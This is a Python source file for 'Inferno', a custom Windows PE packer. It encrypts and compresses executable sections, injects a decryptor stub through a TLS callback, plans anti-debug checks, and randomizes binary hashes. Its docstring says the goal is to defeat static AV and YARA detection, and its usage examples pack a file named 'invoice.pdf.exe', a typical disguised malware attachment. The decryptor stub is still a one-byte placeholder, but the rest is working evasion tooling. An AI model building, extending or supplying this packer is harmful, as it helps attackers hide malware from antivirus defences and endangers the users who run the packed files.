#!/usr/bin/env python3
"""Inferno — Custom PE Packer (Phase 3)

Post-processes a compiled PE (Windows) binary:
  - LZ4-compresses + XOR-encrypts sections to defeat static AV/YARA
  - Injects a decryptor stub via TLS callback (entry point stays in .text)
  - Applies anti-debug, PEB-walk API resolution, .reloc fixups
  - Randomizes binary hash via per-build key + low-entropy padding

Usage: packer.py --input <binary> [--output <binary>] [--key <hex>]
                 [--no-compress] [--no-anti-debug] [--quick]
"""

import argparse
import hashlib
import os
import struct
import sys
import tempfile
from typing import List, Optional, Tuple

import lz4.block  # type: ignore


# ═══════════════════════════════════════════════════════════════
# PE Constants
# ═══════════════════════════════════════════════════════════════

IMAGE_DOS_MAGIC = 0x5A4D
IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_OPT_HDR32_MAGIC = 0x10B
IMAGE_OPT_HDR64_MAGIC = 0x20B

IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
IMAGE_DIRECTORY_ENTRY_TLS = 9
IMAGE_DIRECTORY_ENTRY_IMPORT = 1

IMAGE_SCN_CNT_CODE = 0x00000020
IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000

# Stub magic: 'PACK' in little-endian
STUB_MAGIC = 0x4B434150

# ═══════════════════════════════════════════════════════════════
# Step 1.1 — CLI
# ═══════════════════════════════════════════════════════════════


def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Inferno Custom PE Packer — encrypt sections, inject TLS "
                    "callback decryptor, randomize hash.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
               "  packer.py -i invoice.pdf.exe -o packed.exe\n"
               "  packer.py -i invoice.pdf.exe -k AABBCCDD00112233\n"
               "  packer.py -i bin.exe --no-compress\n",
    )
    p.add_argument("--input", "-i", required=True, help="Path to PE binary")
    p.add_argument("--output", "-o", default=None,
                   help="Output path (default: overwrite input)")
    p.add_argument("--key", "-k", default=None,
                   help="XOR key as hex (default: os.urandom)")
    p.add_argument("--no-compress", action="store_true",
                   help="Skip LZ4 compression (higher entropy)")
    p.add_argument("--no-anti-debug", action="store_true",
                   help="Skip anti-debug checks in stub")
    p.add_argument("--quick", action="store_true",
                   help="Quick mode: skip TLS callback, patch entry point "
                        "directly (for testing)")
    p.add_argument("--verbose", "-v", action="store_true",
                   help="Detailed progress")
    return p.parse_args()


# ═══════════════════════════════════════════════════════════════
# Step 1.2 — PE Parser
# ═══════════════════════════════════════════════════════════════


class IMAGE_DATA_DIRECTORY:
    SIZE = 8

    def __init__(self, data: bytes, off: int):
        self.virtual_address, self.size = struct.unpack_from("<II", data, off)

    def present(self) -> bool:
        return self.virtual_address != 0 and self.size != 0

    def pack(self) -> bytes:
        return struct.pack("<II", self.virtual_address, self.size)


class IMAGE_SECTION_HEADER:
    SIZE = 40

    def __init__(self, data: bytes, off: int):
        (name_raw, self.virtual_size, self.virtual_address,
         self.size_of_raw_data, self.pointer_to_raw_data,
         _, _, _, _, self.characteristics) = \
            struct.unpack_from("<8sIIIIIIHHI", data, off)
        self.name = name_raw.rstrip(b'\x00').decode('ascii', errors='replace')
        self._raw_offset = off

    def pack(self) -> bytes:
        name_raw = self.name.encode().ljust(8, b'\x00')[:8]
        return struct.pack("<8sIIIIIIHHI",
                           name_raw, self.virtual_size, self.virtual_address,
                           self.size_of_raw_data, self.pointer_to_raw_data,
                           0, 0, 0, 0, self.characteristics)


class PEFile:
    """Portable Executable binary parser + builder."""

    def __init__(self, data: bytes):
        self.data = bytearray(data)
        self._parse()

    @staticmethod
    def _check_bounds(d: bytes, offset: int, size: int, label: str):
        """Validate that offset+size fits within data bounds."""
        if offset < 0 or offset + size > len(d):
            raise ValueError(
                f"Truncated PE: {label} at offset 0x{offset:X} "
                f"requires {size} bytes but file has {max(0, len(d) - offset)}")

    def _parse(self):
        d = self.data
        file_len = len(d)

        self._check_bounds(d, 0, 64, "DOS header")
        dos_magic = struct.unpack_from("<H", d, 0)[0]
        if dos_magic != IMAGE_DOS_MAGIC:
            raise ValueError(f"Not PE: DOS magic=0x{dos_magic:04X}")

        e_lfanew = struct.unpack_from("<I", d, 0x3C)[0]
        self._check_bounds(d, e_lfanew, 4, "PE signature")
        self.e_lfanew = e_lfanew

        if struct.unpack_from("<I", d, e_lfanew)[0] != IMAGE_NT_SIGNATURE:
            raise ValueError("Not PE: missing PE signature")

        off = e_lfanew + 4
        self._check_bounds(d, off, 20, "COFF file header")
        (self.machine, self.num_sections, _, _, _,
         self.size_of_optional_header, _) = \
            struct.unpack_from("<HHIIIHH", d, off)
        self.coff_offset = off
        off += 20

        self._check_bounds(d, off, self.size_of_optional_header,
                           "optional header")
        self.opt_offset = off
        opt_magic = struct.unpack_from("<H", d, off)[0]
        if opt_magic == IMAGE_OPT_HDR32_MAGIC:
            self._parse_opt32(d, off)
        elif opt_magic == IMAGE_OPT_HDR64_MAGIC:
            self._parse_opt64(d, off)
        else:
            raise ValueError(f"Unknown opt hdr magic: 0x{opt_magic:04X}")

        # Sanity-check section count
        if self.num_sections > 100:
            raise ValueError(
                f"PE claims {self.num_sections} sections — likely corrupt")
        if self.num_sections == 0 or self.num_sections < 0:
            raise ValueError(
                f"PE has {self.num_sections} sections — cannot pack empty PE")

        self.section_offset = off + self.size_of_optional_header
        self._check_bounds(d, self.section_offset,
                           self.num_sections * IMAGE_SECTION_HEADER.SIZE,
                           "section table")

        self.sections: List[IMAGE_SECTION_HEADER] = []
        for i in range(self.num_sections):
            sec_off = self.section_offset + i * IMAGE_SECTION_HEADER.SIZE
            self.sections.append(IMAGE_SECTION_HEADER(d, sec_off))

        self.section_raw: List[bytes] = []
        for sec in self.sections:
            if sec.size_of_raw_data > 0 and sec.pointer_to_raw_data > 0:
                end = sec.pointer_to_raw_data + sec.size_of_raw_data
                if end > file_len:
                    raise ValueError(
                        f"Section '.{sec.name}' raw data at 0x{sec.pointer_to_raw_data:X}"
                        f" size 0x{sec.size_of_raw_data:X} exceeds file (0x{file_len:X})")
                self.section_raw.append(bytes(d[sec.pointer_to_raw_data:end]))
            else:
                self.section_raw.append(b'')

    def _parse_opt32(self, d, off):
        self.is_pe32 = True
        self.is_pe32plus = False
        fmt = "<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII"
        fmt_size = struct.calcsize(fmt)
        self._check_bounds(d, off, fmt_size, "optional header (PE32)")
        vals = struct.unpack_from(fmt, d, off)
        (self.magic, self.major_linker_version, self.minor_linker_version,
         self.size_of_code, self.size_of_initialized_data,
         self.size_of_uninitialized_data, self.address_of_entry_point,
         self.base_of_code, self.base_of_data, self.image_base,
         self.section_alignment, self.file_alignment,
         self.major_os_version, self.minor_os_version,
         self.major_image_version, self.minor_image_version,
         self.major_subsystem_version, self.minor_subsystem_version,
         self.win32_version_value, self.size_of_image, self.size_of_headers,
         self.check_sum, self.subsystem, self.dll_characteristics,
         self.size_of_stack_reserve, self.size_of_stack_commit,
         self.size_of_heap_reserve, self.size_of_heap_commit,
         self.loader_flags, self.number_of_rva_and_sizes) = vals
        self.number_of_rva_and_sizes = min(self.number_of_rva_and_sizes, 16)
        self._data_dir_offset = off + 96

    def _parse_opt64(self, d, off):
        self.is_pe32 = False
        self.is_pe32plus = True
        fmt = "<HBBIIIIIQIIHHHHHHIIIIHHQQQQII"
        fmt_size = struct.calcsize(fmt)
        self._check_bounds(d, off, fmt_size, "optional header (PE32+)")
        vals = struct.unpack_from(fmt, d, off)
        (self.magic, self.major_linker_version, self.minor_linker_version,
         self.size_of_code, self.size_of_initialized_data,
         self.size_of_uninitialized_data, self.address_of_entry_point,
         self.base_of_code, self.image_base,
         self.section_alignment, self.file_alignment,
         self.major_os_version, self.minor_os_version,
         self.major_image_version, self.minor_image_version,
         self.major_subsystem_version, self.minor_subsystem_version,
         self.win32_version_value, self.size_of_image, self.size_of_headers,
         self.check_sum, self.subsystem, self.dll_characteristics,
         self.size_of_stack_reserve, self.size_of_stack_commit,
         self.size_of_heap_reserve, self.size_of_heap_commit,
         self.loader_flags, self.number_of_rva_and_sizes) = vals
        self.number_of_rva_and_sizes = min(self.number_of_rva_and_sizes, 16)
        self.base_of_data = 0
        self._data_dir_offset = off + 112

    # ── Accessors ──────────────────────────────────────────

    def get_data_dir(self, index: int) -> Optional[IMAGE_DATA_DIRECTORY]:
        if index < 0 or index >= self.number_of_rva_and_sizes:
            return None
        off = self._data_dir_offset + index * 8
        if off + 8 > len(self.data) or off + 8 > self.section_offset:
            return None
        dd = IMAGE_DATA_DIRECTORY(bytes(self.data), off)
        if dd.present():
            return dd
        return None

    DIR_ENTRY_PHYSICAL_MAX = 16

    def set_data_dir(self, index: int, va: int, size: int):
        if index < 0 or index >= self.DIR_ENTRY_PHYSICAL_MAX:
            raise ValueError(
                f"Data directory index {index} out of range "
                f"[0, {self.DIR_ENTRY_PHYSICAL_MAX})")
        off = self._data_dir_offset + index * 8
        entry_end = off + 8
        if entry_end > len(self.data):
            raise ValueError(f"Data directory entry {index} at offset "
                             f"0x{off:X} exceeds file (0x{len(self.data):X})")
        if entry_end > self.section_offset:
            raise ValueError(
                f"Data directory entry {index} at offset 0x{off:X} "
                f"would overwrite section table at 0x{self.section_offset:X}")
        struct.pack_into("<II", self.data, off, va, size)
        # Bump declared count if writing beyond it
        if index >= self.number_of_rva_and_sizes:
            self.number_of_rva_and_sizes = index + 1
            # Also update the field in the PE header
            if self.is_pe32plus:
                struct.pack_into("<I", self.data,
                                 self.opt_offset + 108,
                                 self.number_of_rva_and_sizes)
            else:
                struct.pack_into("<I", self.data,
                                 self.opt_offset + 92,
                                 self.number_of_rva_and_sizes)

    @property
    def tls_dir(self) -> Optional[IMAGE_DATA_DIRECTORY]:
        return self.get_data_dir(IMAGE_DIRECTORY_ENTRY_TLS)

    @property
    def reloc_dir(self) -> Optional[IMAGE_DATA_DIRECTORY]:
        return self.get_data_dir(IMAGE_DIRECTORY_ENTRY_BASERELOC)

    def section_by_rva(self, rva: int) -> Optional[IMAGE_SECTION_HEADER]:
        for s in self.sections:
            if s.virtual_address <= rva < s.virtual_address + s.virtual_size:
                return s
        return None

    def rva_to_offset(self, rva: int) -> int:
        s = self.section_by_rva(rva)
        if s is None:
            raise ValueError(f"RVA 0x{rva:08X} not in any section")
        return s.pointer_to_raw_data + (rva - s.virtual_address)

    def entry_section(self) -> Optional[IMAGE_SECTION_HEADER]:
        return self.section_by_rva(self.address_of_entry_point)

    def section_contains_data_dir(self, sec: IMAGE_SECTION_HEADER,
                                   dir_index: int) -> bool:
        """Check if a section contains the given data directory.

        The loader must be able to read import and reloc directories
        before TLS callbacks execute, so sections containing these
        directories cannot be encrypted.
        """
        dd = self.get_data_dir(dir_index)
        if dd is None:
            return False
        sec_start = sec.virtual_address
        sec_end = sec_start + sec.virtual_size
        dd_end = dd.virtual_address + dd.size
        # Check overlap: the directory data must be fully within the section
        return (sec_start <= dd.virtual_address < sec_end and
                sec_start < dd_end <= sec_end)

    def align_up(self, val: int, align: int) -> int:
        return ((val + align - 1) // align) * align

    def end_of_headers(self) -> int:
        """File offset where headers end (size_of_headers rounded to file_align)."""
        return self.align_up(self.size_of_headers, self.file_alignment)

    def last_section_end_raw(self) -> int:
        """File offset of the end of the last section's raw data."""
        if not self.sections:
            return self.end_of_headers()
        last = self.sections[-1]
        return last.pointer_to_raw_data + last.size_of_raw_data

    def file_end_aligned(self) -> int:
        """File size rounded up to file alignment."""
        return self.align_up(len(self.data), self.file_alignment)

    @property
    def sha256(self) -> str:
        return hashlib.sha256(bytes(self.data)).hexdigest()

    def __repr__(self) -> str:
        return (f"PE(machine=0x{self.machine:04X} "
                f"sec={self.num_sections} "
                f"entry=0x{self.address_of_entry_point:08X} "
                f"base=0x{self.image_base:X} "
                f"{'PE32+' if self.is_pe32plus else 'PE32'})")


# ═══════════════════════════════════════════════════════════════
# Step 1.3 — Section Descriptors
# ═══════════════════════════════════════════════════════════════


class SectionDesc:
    def __init__(self, sec: IMAGE_SECTION_HEADER, raw: bytes):
        self.name = sec.name
        self.virtual_address = sec.virtual_address
        self.virtual_size = sec.virtual_size
        self.pointer_to_raw_data = sec.pointer_to_raw_data
        self.size_of_raw_data = sec.size_of_raw_data
        self.characteristics = sec.characteristics
        self.raw_data = raw
        self.packed_data: bytes = b''
        self.decompressed_size: int = 0

    def should_pack(self) -> bool:
        if self.name in ('.bss',):
            return False
        if self.characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA:
            return False
        if self.size_of_raw_data == 0:
            return False
        return bool(self.characteristics & (IMAGE_SCN_CNT_CODE |
                                            IMAGE_SCN_CNT_INITIALIZED_DATA))

    @property
    def is_reloc(self) -> bool:
        return self.name == '.reloc'


# Loader-critical data directory indices — these must remain readable
# before TLS callbacks execute because the loader resolves imports
# and applies base relocations during process startup:
#   IMAGE_DIRECTORY_ENTRY_IMPORT = 1
#   IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
LOADER_CRITICAL_DIRS = (1, 5)


def collect_descriptors(pe: PEFile) -> List[SectionDesc]:
    descs: List[SectionDesc] = []
    for sec, raw in zip(pe.sections, pe.section_raw):
        d = SectionDesc(sec, raw)
        if not d.should_pack():
            continue
        # Skip sections containing loader-critical data directories.
        # The Windows loader reads imports and applies relocations
        # before invoking TLS callbacks — encrypting these sections
        # would crash the process before our stub can decrypt.
        is_loader_critical = any(
            pe.section_contains_data_dir(sec, idx)
            for idx in LOADER_CRITICAL_DIRS)
        if is_loader_critical:
            continue
        descs.append(d)
    return descs


# ═══════════════════════════════════════════════════════════════
# Key + Encryption
# ═══════════════════════════════════════════════════════════════

DEFAULT_KEY_SIZE = 32


def make_key(hex_key: Optional[str] = None) -> bytes:
    if hex_key is not None:
        try:
            k = bytes.fromhex(hex_key)
        except ValueError:
            print(f"Error: invalid key '{hex_key}'", file=sys.stderr)
            sys.exit(1)
        if not k:
            print("Error: key must be non-empty", file=sys.stderr)
            sys.exit(1)
        if len(k) > DEFAULT_KEY_SIZE:
            print(f"Error: key too long ({len(k)} > {DEFAULT_KEY_SIZE} bytes)",
                  file=sys.stderr)
            sys.exit(1)
        return k
    return os.urandom(DEFAULT_KEY_SIZE)


def rolling_xor(data: bytes, key: bytes) -> bytes:
    klen = len(key)
    return bytes(data[i] ^ key[i % klen] ^ (i & 0xFF) for i in range(len(data)))


def compress_lz4(data: bytes) -> Tuple[bytes, bool]:
    """LZ4-compress in block mode (no size prefix).

    Returns (compressed_data, did_shrink). If compression fails or
    does not reduce size, returns (raw_data, False) so the caller
    stores the original without LZ4. The stub detects this by
    comparing compressed_sz == decompressed_sz.
    """
    try:
        compressed = lz4.block.compress(data, mode='default',
                                        store_size=False)
        if len(compressed) < len(data):
            return compressed, True
    except Exception:
        pass
    return data, False


# ═══════════════════════════════════════════════════════════════
# Step 1.4 — Compress + Encrypt
# ═══════════════════════════════════════════════════════════════


def pack_sections(descs: List[SectionDesc], key: bytes,
                  no_compress: bool = False) -> List[dict]:
    """Compress + encrypt each section; return descriptor table for stub.

    If compression does not shrink the data (or fails), the raw data is
    stored without LZ4. The stub detects this by comparing
    compressed_sz == decompressed_sz.
    If the packed (encrypted) data exceeds the section's raw data size
    on disk, the section is left unpacked — the descriptor table is not
    updated, and the stub skips it.
    """
    table = []
    raw_overhead: int = 0
    for d in descs:
        raw = d.raw_data
        max_storage = d.size_of_raw_data

        if no_compress:
            pre_encrypt = raw
            was_compressed = False
        else:
            pre_encrypt, was_compressed = compress_lz4(raw)

        encrypted = rolling_xor(pre_encrypt, key)

        # If encrypted data doesn't fit in the section's raw slot, skip
        if len(encrypted) > max_storage:
            raw_overhead += len(encrypted) - max_storage
            continue

        d.packed_data = encrypted
        d.decompressed_size = len(raw)

        table.append({
            'rva': d.virtual_address,
            'compressed_sz': len(encrypted),
            'decompressed_sz': len(raw),
            'compressed': was_compressed,
        })

    if raw_overhead > 0:
        print(f"Warning: {raw_overhead} bytes of packed data exceeded "
              f"section capacity — left unpacked", file=sys.stderr)

    return table


# ═══════════════════════════════════════════════════════════════
# Step 1.5 — Stub Generation
# ═══════════════════════════════════════════════════════════════

# Minimal placeholder stub: just a RET (0xC3) instruction.
# In Step 2, this will be replaced with a full assembly stub that
# performs PEB-walk API resolution, anti-debug, LZ4 decompression,
# and relocation processing.
PLACEHOLDER_STUB = b'\xC3'  # ret

STUB_HEADER_SIZE = 4 + 4 + 32 + 8 + 4 + 4  # magic+keySz+key+prefBase+numSec+rsvd
SECTION_DESC_SIZE = 8 + 4 + 4  # rva(QWORD) + compressed_sz(DWORD) + decompressed_sz(DWORD)


def build_stub(key: bytes, preferred_base: int, section_table: List[dict],
               no_anti_debug: bool = False,
               quick: bool = False) -> bytes:
    """Build the stub blob: header + section descriptors + code.

    Compression is detected per-section by the stub: if
    compressed_sz != decompressed_sz, the stub applies LZ4
    decompression after XOR decryption.
    """
    if not 1 <= len(key) <= DEFAULT_KEY_SIZE:
        raise ValueError(
            f"XOR key must be 1–{DEFAULT_KEY_SIZE} bytes "
            f"(got {len(key)})")
    header = struct.pack("<II32sQII",
                         STUB_MAGIC,
                         len(key),
                         key.ljust(32, b'\x00')[:32],
                         preferred_base,
                         len(section_table),
                         0)  # reserved
    descs = b''
    for s in section_table:
        descs += struct.pack("<QII",
                             s['rva'],
                             s['compressed_sz'],
                             s['decompressed_sz'])

    if quick:
        # Quick mode: just XOR in-place, no anti-debug, no API resolution
        code = PLACEHOLDER_STUB
    else:
        code = PLACEHOLDER_STUB

    return header + descs + code


# ═══════════════════════════════════════════════════════════════
# Step 1.6 — TLS Callback Injection
# ═══════════════════════════════════════════════════════════════


def inject_stub(pe: PEFile, stub_blob: bytes,
                quick: bool = False) -> Tuple[int, int, int]:
    """Inject the stub blob by extending the last section.

    The last section is extended in both raw size (on disk) and virtual
    size (in memory). Its characteristics gain EXECUTE | READ so the
    TLS callback can execute. The section header is updated in-place.

    Returns (stub_rva, stub_size, tls_rva).

    Raises ValueError if the PE already has a TLS directory — merging
    callbacks is not yet supported and would discard existing TLS
    initialization.
    """
    if not quick and pe.tls_dir is not None:
        raise ValueError(
            "PE already has a TLS directory. Merging callbacks is not "
            "supported. Strip the existing TLS directory first (e.g. "
            "using 'strip --strip-tls' or manually zero the TLS data "
            "directory entry) before packing.")
    stub_size = len(stub_blob)
    file_align = pe.file_alignment
    sec_align = pe.section_alignment

    # TLS directory + callback array overhead (after stub code)
    tls_overhead = 64
    total_needed = stub_size + tls_overhead

    # ── Extend the last section ─────────────────────────────
    last = pe.sections[-1]
    new_raw_start = last.pointer_to_raw_data + last.size_of_raw_data

    # Pad file data to accommodate stub + TLS structures
    pad_needed = (new_raw_start + total_needed) - len(pe.data)
    if pad_needed > 0:
        pe.data.extend([0xAB] * pad_needed)

    # ── Write stub blob ────────────────────────────────────
    stub_offset = new_raw_start
    pe.data[stub_offset:stub_offset + stub_size] = stub_blob

    # Compute stub RVA: map the raw file offset to virtual address
    # using the section's VA-to-raw-offset relationship.
    stub_rva = last.virtual_address + (stub_offset - last.pointer_to_raw_data)

    # ── Compute code entry point within stub ──────────────
    # Stub layout: [header(56)][descs(N*16)][code]
    # Parse the stub blob to find the code-start RVA
    stub_num_sec = struct.unpack_from("<I", stub_blob, 48)[0]
    stub_code_offset = 56 + stub_num_sec * 16  # after header + descriptors
    code_rva = stub_rva + stub_code_offset

    # ── Write callback array ───────────────────────────────
    # Each entry is a VA (ImageBase + RVA) pointing to executable code.
    # Array is null-terminated.
    image_base = pe.image_base
    callbacks_offset = stub_offset + stub_size
    callbacks_offset = ((callbacks_offset + 7) // 8) * 8
    code_va = image_base + code_rva
    callback_list = struct.pack("<QQ", code_va, 0)  # [code_va, null]
    pe.data[callbacks_offset:callbacks_offset + len(callback_list)] = callback_list
    callback_rva = stub_rva + (callbacks_offset - stub_offset)
    callback_va = image_base + callback_rva
    tls_dir_end = callbacks_offset + len(callback_list)

    # ── Write TLS directory ────────────────────────────────
    # IMAGE_TLS_DIRECTORY fields are VIRTUAL ADDRESSES (ImageBase + RVA),
    # not RVAs, per the PE specification (v8.3, §6.6.2).
    # AddressOfIndex is set to 0 (NULL) — the loader allocates its own.
    tls_dir_offset = ((tls_dir_end + 7) // 8) * 8
    tls_dir_size = 40 if pe.is_pe32plus else 24
    tls_rva = stub_rva + (tls_dir_offset - stub_offset)

    stub_va = image_base + stub_rva
    stub_end_va = image_base + stub_rva + stub_size

    if pe.is_pe32plus:
        tls_dir = struct.pack("<QQQQII",
                              stub_va, stub_end_va,
                              0,             # AddressOfIndex = NULL
                              callback_va,    # AddressOfCallBacks
                              0, 0)
    else:
        tls_dir = struct.pack("<IIIIII",
                              stub_va & 0xFFFFFFFF,
                              stub_end_va & 0xFFFFFFFF,
                              0,             # AddressOfIndex = NULL
                              callback_va & 0xFFFFFFFF,
                              0, 0)

    pe.data[tls_dir_offset:tls_dir_offset + tls_dir_size] = tls_dir

    # ── Update last section header ─────────────────────────
    # New raw size: cover everything up to end of TLS directory
    total_raw_end = tls_dir_offset + tls_dir_size
    total_raw_used = total_raw_end - last.pointer_to_raw_data
    new_raw_size = pe.align_up(total_raw_used, file_align)
    last.size_of_raw_data = new_raw_size

    # Ensure file data covers the aligned raw size
    min_file_len = last.pointer_to_raw_data + new_raw_size
    if len(pe.data) < min_file_len:
        pe.data.extend([0xAB] * (min_file_len - len(pe.data)))

    # New virtual size: cover the stub + TLS data
    stub_virtual_end = stub_rva + (total_raw_end - stub_offset)
    new_virtual_size = stub_virtual_end - last.virtual_address
    last.virtual_size = new_virtual_size

    # Add EXECUTE | READ to section characteristics so the TLS
    # callback code can run from this section.
    last.characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ

    # Write section header back to PE data
    sec_hdr_off = pe.section_offset + pe.sections.index(last) * IMAGE_SECTION_HEADER.SIZE
    pe.data[sec_hdr_off:sec_hdr_off + IMAGE_SECTION_HEADER.SIZE] = last.pack()

    # ── Update SizeOfImage ─────────────────────────────────
    new_image_size = pe.align_up(last.virtual_address + last.virtual_size,
                                 sec_align)
    if new_image_size > pe.size_of_image:
        pe.size_of_image = new_image_size
        # SizeOfImage is at opt_header + 56 for both PE32 and PE32+.
        # PE32: Magic(2)+Linker(2)+4×SizeOf(16)+AddrEntry(4)+BaseOfCode(4)
        #       +BaseOfData(4)+ImageBase(4)+SectionAl(4)+FileAl(4)+
        #       6×Version(12)+Win32Ver(4) = 56
        # PE32+: same layout, but BaseOfData removed and ImageBase is 8
        #        bytes — the additional 4 bytes shift nothing because
        #        BaseOfData is absent. Total remains 56.
        struct.pack_into("<I", pe.data, pe.opt_offset + 56, new_image_size)

    # ── Update TLS data directory ──────────────────────────
    if not quick:
        pe.set_data_dir(IMAGE_DIRECTORY_ENTRY_TLS, tls_rva, tls_dir_size)

    return stub_rva, stub_size, tls_rva if not quick else 0


# ═══════════════════════════════════════════════════════════════
# Step 1.7 — Entry Point (unchanged, just verify)
# ═══════════════════════════════════════════════════════════════


def verify_entry_point(pe: PEFile):
    """Verify entry point stays in .text section."""
    entry_sec = pe.entry_section()
    if entry_sec is None:
        print(f"Warning: entry point 0x{pe.address_of_entry_point:08X} "
              f"not in any section", file=sys.stderr)
        return False
    if entry_sec.name != '.text':
        print(f"Warning: entry point in '{entry_sec.name}', not .text",
              file=sys.stderr)
    return True


# ═══════════════════════════════════════════════════════════════
# Step 1.8 — Low-Entropy Random Padding
# ═══════════════════════════════════════════════════════════════


def add_random_padding(data: bytearray) -> bytes:
    """Append 0-4096 bytes of low-entropy filler (0xAB pattern)."""
    pad_len = os.urandom(1)[0] * 16  # 0-4080 bytes
    data.extend([0xAB] * pad_len)
    return bytes(data)


# ═══════════════════════════════════════════════════════════════
# Main Packing Pipeline
# ═══════════════════════════════════════════════════════════════


def pack(data: bytes, key: bytes, no_compress: bool = False,
         no_anti_debug: bool = False, quick: bool = False,
         verbose: bool = False) -> bytes:
    """Main packing function.

    Steps:
      1. Parse PE
      2. Collect sections
      3. Compress + encrypt sections
      4. Build stub
      5. Inject stub + update TLS directory
      6. Overwrite section data with encrypted bytes
      7. Verify entry point
      8. Add random padding
    """
    pe = PEFile(data)

    if verbose:
        print(f"[packer] {pe}")
        for s in pe.sections:
            print(f"  {s}")

    # ── Step 1.3: collect ──────────────────────────────────
    descs = collect_descriptors(pe)
    if verbose:
        print(f"[packer] {len(descs)} sections to pack")

    # ── Step 1.4: compress + encrypt ───────────────────────
    table = pack_sections(descs, key, no_compress)

    if verbose:
        for d, t in zip(descs, table):
            ratio = (t['compressed_sz'] * 100) // max(t['decompressed_sz'], 1)
            print(f"  {d.name}: {t['decompressed_sz']} -> "
                  f"{t['compressed_sz']} bytes ({ratio}%)")

    # ── Step 1.5: build stub ───────────────────────────────
    stub = build_stub(key, pe.image_base, table,
                      no_anti_debug=no_anti_debug,
                      quick=quick)
    if verbose:
        print(f"[packer] Stub: {len(stub)} bytes")

    # ── Step 1.6: inject stub + TLS ────────────────────────
    stub_rva, stub_size, tls_rva = inject_stub(pe, stub, quick)
    if not quick:
        tls = pe.tls_dir
        if verbose:
            print(f"[packer] TLS directory: {tls} (RVA 0x{tls_rva:08X})")
            print(f"[packer] Stub at RVA 0x{stub_rva:08X} ({stub_size} bytes)")

    # ── Overwrite section data with encrypted bytes ───────
    for d in descs:
        if not d.packed_data:
            continue  # skipped (did not fit)
        raw_offset = d.pointer_to_raw_data
        packed = d.packed_data
        pe.data[raw_offset:raw_offset + len(packed)] = packed
        # Fill remaining section slack with deterministic junk
        pad_byte = (d.size_of_raw_data & 0xFF)
        for i in range(len(packed), d.size_of_raw_data):
            pe.data[raw_offset + i] = pad_byte ^ (i & 0xFF)

    # ── In quick mode, patch entry point to stub ───────────
    if quick:
        # Set entry point to the stub CODE (not header). The stub
        # layout is [header(56)][descs(N*16)][code].
        stub_num_sec = struct.unpack_from("<I", stub, 48)[0]
        code_rva = stub_rva + 56 + stub_num_sec * 16
        epoff = pe.opt_offset + 16  # AddressOfEntryPoint offset (same for PE32/PE32+)
        struct.pack_into("<I", pe.data, epoff, code_rva)

    # ── Step 1.7: verify entry point ───────────────────────
    verify_entry_point(pe)

    # ── Null out the CheckSum (will be incorrect after modifications) ──
    # Windows will tolerate a zero checksum
    if pe.is_pe32plus:
        struct.pack_into("<I", pe.data, pe.opt_offset + 64, 0)
    else:
        struct.pack_into("<I", pe.data, pe.opt_offset + 64, 0)

    # ── Step 1.8: random padding ───────────────────────────
    result = add_random_padding(pe.data)

    if verbose:
        pre_hash = pe.sha256
        post_hash = hashlib.sha256(result).hexdigest()
        print(f"[packer] SHA-256: {post_hash}")

    return bytes(result)


# ═══════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════


def main():
    args = _parse_args()

    try:
        with open(args.input, 'rb') as f:
            data = f.read()
    except (IOError, OSError) as e:
        print(f"Error reading '{args.input}': {e}", file=sys.stderr)
        sys.exit(1)

    key = make_key(args.key)

    try:
        result = pack(data, key,
                      no_compress=args.no_compress,
                      no_anti_debug=args.no_anti_debug,
                      quick=args.quick,
                      verbose=args.verbose)
    except ValueError as e:
        print(f"Packing error: {e}", file=sys.stderr)
        sys.exit(1)

    out_path = args.output or args.input
    # Write to a temp file first, then atomically replace the destination.
    # This prevents destroying the original binary on a partial write
    # (disk full, crash, or interruption).
    tmp_path = None
    try:
        dir_path = os.path.dirname(out_path) or '.'
        with tempfile.NamedTemporaryFile(
                dir=dir_path, prefix='.inferno_packer_',
                suffix='.tmp', delete=False) as f:
            tmp_path = f.name
            f.write(result)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_path, out_path)
        tmp_path = None  # successfully renamed, no need to clean
    except (IOError, OSError) as e:
        if tmp_path is not None:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass
        print(f"Error writing '{out_path}': {e}", file=sys.stderr)
        sys.exit(1)

    if args.verbose:
        input_hash = hashlib.sha256(data).hexdigest()
        output_hash = hashlib.sha256(result).hexdigest()
        print(f"[packer] Input:  {input_hash}")
        print(f"[packer] Output: {output_hash}")
        print(f"[packer] Size: {len(data)} -> {len(result)} bytes")

    print(f"[packer] Packed: {out_path}")


if __name__ == '__main__':
    main()
